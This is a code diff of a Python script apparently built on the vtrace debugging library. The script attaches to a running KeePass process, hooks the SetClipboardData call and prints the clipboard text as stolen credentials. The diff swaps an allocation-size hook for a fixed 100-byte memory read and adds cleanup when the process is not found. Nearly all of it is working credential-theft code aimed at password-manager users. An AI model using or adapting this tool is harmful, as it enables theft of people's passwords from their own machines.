@@ -11,26 +11,14 @@ import vdb
 from envi.archs import i386 as arch
 
 trace = None
-AllocSize = 0
-
-def allochook(event, trace, ret_addr, args, callconv):
-    global hClipboardData
-    global AllocSize
-        
-    if args[0] == 2: #GMEM MOVEABLE
-        AllocSize = int(args[1])
-    else:
-        return
-
-    return
 
 def cliphook(event, trace, ret_addr, args, callconv):
     if args[0] == 1: #CF_TEXT clipboardtype
         clip_addr = trace.getRegister(arch.REG_ESP) + 0x1C
         clip_struct = trace.readMemory(clip_addr,4)
         sAddress = struct.unpack("L", clip_struct)[0]
-        clip_string = trace.readMemory(sAddress,AllocSize)
-        clip_string = clip_string.split("\x00")[0] #Couldn't find a function to read a string and Allocsize isn't the length
+        clip_string = trace.readMemory(sAddress,100)  # Read 100 bytes (lazy me couldn't find a string function)
+        clip_string = clip_string.split("\x00")[0] # Ghetto readString()
         print "[*] Cliphook cred: %s" % clip_string
         return
 
@@ -51,10 +39,7 @@ def attach(pid, base=None):
 
     bp = vtrace.breakpoints.HookBreakpoint('user32.SetClipboardData')
     bp.addPreHook(cliphook)
-    bpid = trace.addBreakpoint(bp)
-    bp2 = vtrace.breakpoints.HookBreakpoint('kernel32.GlobalAlloc')
-    bp2.addPreHook(allochook)
-    trace.addBreakpoint(bp2)
+    trace.addBreakpoint(bp)
 
     print "[*] Waiting for clipboard operations to steal credentials...."
 
@@ -66,7 +51,6 @@ def main(argv):
     global trace
 
     trace = vtrace.getTrace()
-    #vtrace.platforms.win32.getDebugPrivileges()
     if len(argv) != 2:
         print "Usage: %s <KeePass.exe>" % sys.argv[0]
         sys.exit(1)
@@ -76,6 +60,7 @@ def main(argv):
         print "Found PID: %i" % pid
     else:
         print "Program not running"
+        trace.release()
         sys.exit(1)
     attach(pid)
 
